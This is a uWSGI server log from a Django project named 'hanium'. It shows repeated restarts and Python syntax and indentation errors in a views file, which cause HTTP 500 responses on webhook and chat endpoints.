  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 96
    print(i, '/', len(df))
        ^
IndentationError: expected an indented block
[pid: 4318|app: 0|req: 1/1] 66.102.6.201 () {42 vars in 540 bytes} [Thu Aug 27 06:16:07 2020] POST /webhook/ => generated 101963 bytes in 70 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Aug 27 06:16:48 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x5612c9d7ad00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x5612c9d7ad00 pid: 4328 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 4328, cores: 1)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 96
    print(i, '/', len(df))
        ^
IndentationError: expected an indented block
[pid: 4328|app: 0|req: 1/1] 66.102.6.203 () {42 vars in 540 bytes} [Thu Aug 27 06:16:52 2020] POST /webhook/ => generated 101962 bytes in 69 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Aug 27 06:18:34 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x5653b16a0d00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x5653b16a0d00 pid: 4341 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 4341, cores: 1)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 121
    def predict_pos_text(text):
      ^
SyntaxError: invalid syntax
[pid: 4341|app: 0|req: 1/1] 66.102.6.203 () {42 vars in 540 bytes} [Thu Aug 27 06:18:42 2020] POST /webhook/ => generated 101874 bytes in 70 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Aug 27 06:19:59 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x558183266d00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x558183266d00 pid: 4352 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 4352, cores: 1)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 149
    
    ^
SyntaxError: unexpected EOF while parsing
[pid: 4352|app: 0|req: 1/1] 66.102.6.201 () {42 vars in 540 bytes} [Thu Aug 27 06:20:03 2020] POST /webhook/ => generated 101903 bytes in 69 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Aug 27 06:23:04 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x561882e7dd00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x561882e7dd00 pid: 4361 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 4361, cores: 1)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 70
    token=[]
        ^
SyntaxError: invalid syntax
[pid: 4361|app: 0|req: 1/1] 66.102.6.205 () {42 vars in 540 bytes} [Thu Aug 27 06:23:09 2020] POST /webhook/ => generated 101855 bytes in 69 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
Internal Server Error: /
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 70
    token=[]
        ^
SyntaxError: invalid syntax
[pid: 4361|app: 0|req: 2/2] 223.194.169.151 () {50 vars in 873 bytes} [Thu Aug 27 06:24:05 2020] GET / => generated 102536 bytes in 64 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
Internal Server Error: /favicon.ico
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/deprecation.py", line 93, in __call__
    response = self.process_request(request)
  File "/usr/local/lib/python3.6/dist-packages/django/middleware/common.py", line 53, in process_request
    if self.should_redirect_with_slash(request):
  File "/usr/local/lib/python3.6/dist-packages/django/middleware/common.py", line 71, in should_redirect_with_slash
    not is_valid_path(request.path_info, urlconf) and
  File "/usr/local/lib/python3.6/dist-packages/django/urls/base.py", line 154, in is_valid_path
    resolve(path, urlconf)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/base.py", line 25, in resolve
    return get_resolver(urlconf).resolve(path)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 70
    token=[]
        ^
SyntaxError: invalid syntax
[pid: 4361|app: 0|req: 3/3] 223.194.169.151 () {48 vars in 791 bytes} [Thu Aug 27 06:24:06 2020] GET /favicon.ico => generated 118323 bytes in 70 msecs (HTTP/1.1 500) 2 headers in 96 bytes (1 switches on core 0)
Internal Server Error: /chat
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/deprecation.py", line 93, in __call__
    response = self.process_request(request)
  File "/usr/local/lib/python3.6/dist-packages/django/middleware/common.py", line 53, in process_request
    if self.should_redirect_with_slash(request):
  File "/usr/local/lib/python3.6/dist-packages/django/middleware/common.py", line 71, in should_redirect_with_slash
    not is_valid_path(request.path_info, urlconf) and
  File "/usr/local/lib/python3.6/dist-packages/django/urls/base.py", line 154, in is_valid_path
    resolve(path, urlconf)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/base.py", line 25, in resolve
    return get_resolver(urlconf).resolve(path)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 70
    token=[]
        ^
SyntaxError: invalid syntax
[pid: 4361|app: 0|req: 4/4] 223.194.169.151 () {50 vars in 881 bytes} [Thu Aug 27 06:24:13 2020] GET /chat => generated 118414 bytes in 69 msecs (HTTP/1.1 500) 2 headers in 96 bytes (1 switches on core 0)
Internal Server Error: /favicon.ico
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/deprecation.py", line 93, in __call__
    response = self.process_request(request)
  File "/usr/local/lib/python3.6/dist-packages/django/middleware/common.py", line 53, in process_request
    if self.should_redirect_with_slash(request):
  File "/usr/local/lib/python3.6/dist-packages/django/middleware/common.py", line 71, in should_redirect_with_slash
    not is_valid_path(request.path_info, urlconf) and
  File "/usr/local/lib/python3.6/dist-packages/django/urls/base.py", line 154, in is_valid_path
    resolve(path, urlconf)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/base.py", line 25, in resolve
    return get_resolver(urlconf).resolve(path)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 70
    token=[]
        ^
SyntaxError: invalid syntax
[pid: 4361|app: 0|req: 5/5] 223.194.169.151 () {48 vars in 795 bytes} [Thu Aug 27 06:24:13 2020] GET /favicon.ico => generated 118327 bytes in 69 msecs (HTTP/1.1 500) 2 headers in 96 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Aug 27 06:24:41 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x5570db828d00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x5570db828d00 pid: 4368 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 4368, cores: 1)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 70
    token = []
        ^
SyntaxError: invalid syntax
[pid: 4368|app: 0|req: 1/1] 66.102.6.203 () {42 vars in 540 bytes} [Thu Aug 27 06:24:47 2020] POST /webhook/ => generated 101857 bytes in 69 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Aug 27 06:34:18 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x5574954e8d00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x5574954e8d00 pid: 4555 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 4555, cores: 1)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
